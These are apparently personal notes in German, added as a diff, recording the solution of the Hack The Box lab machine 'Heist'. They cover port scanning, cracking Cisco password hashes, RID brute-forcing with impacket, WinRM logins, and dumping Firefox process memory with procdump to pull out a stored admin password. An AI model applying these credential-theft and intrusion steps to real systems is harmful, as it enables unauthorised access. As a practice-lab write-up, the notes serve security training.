@@ -1,0 +1,56 @@
+Heist
+======================
+PORT    STATE SERVICE       VERSION
+80/tcp  open  http          Microsoft IIS httpd 10.0
+135/tcp open  msrpc         Microsoft Windows RPC
+445/tcp open  microsoft-ds?
+5985/tcp  open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+49669/tcp open  msrpc   Microsoft Windows RPC
+
+
+- Als Gast einloggen und Attachment herunterladen
+   => enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
+       => “stealth1agent” (john; rockyou.txt)
+   => username rout3r password 7 0242114B0E143F015F5D1E161713
+       => $uperP@ssword (https://www.ifm.net.nz/cookbooks/passwordcracker.html)
+   => username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
+       => Q4)sJu\Y8qz*A3?d (https://www.ifm.net.nz/cookbooks/passwordcracker.html)
+- evil-winrm.rb -u hazard -p stealth1agent -i heist.htb (funktioniert nicht)
+- RID bruteforce mit impacket/lookupsid.py
+  => python lookupsid.py hazard:stealth1agent@heist.htb
+-------------------------------------------------------------------
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+[*] Brute forcing SIDs at heist.htb
+[*] StringBinding ncacn_np:heist.htb[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
+500: SUPPORTDESK\Administrator (SidTypeUser)
+501: SUPPORTDESK\Guest (SidTypeUser)
+503: SUPPORTDESK\DefaultAccount (SidTypeUser)
+504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
+513: SUPPORTDESK\None (SidTypeGroup)
+1008: SUPPORTDESK\Hazard (SidTypeUser)
+1009: SUPPORTDESK\support (SidTypeUser)
+1012: SUPPORTDESK\Chase (SidTypeUser)
+1013: SUPPORTDESK\Jason (SidTypeUser)
+-----------------------------------------------------------------
+- evil-winrm.rb -u Chase -p 'Q4)sJu\Y8qz*A3?d' -i heist.htb
+  => user.txt am Desktop
+  => todo.txt
+     => "Keep checking the issues list"
+- get-process -name firefox
+------------------------------------------------------------------
+- Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+    341      19    10028      37396       0.70    856   1 firefox
+   1147      70   122076     194232      26.31   5440   1 firefox
+    407      31    16960      62792       1.63   6312   1 firefox
+    390      30    29052      61452      39.09   6600   1 firefox
+    358      27    16352      37740       0.58   6892   1 firefox
+----------------------------------------------------------------
+- upload procdump64.exe
+-  ./procdump64.exe -ma 856 firefox.dmp
+- findstr "login_password" firefox.dmp
+   => login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ
+./evil-winrm/evil-winrm.rb -u Administrator -p '4dD!5}x/re8]FBuZ' -i heist.htb
+- root.txt am Desktop
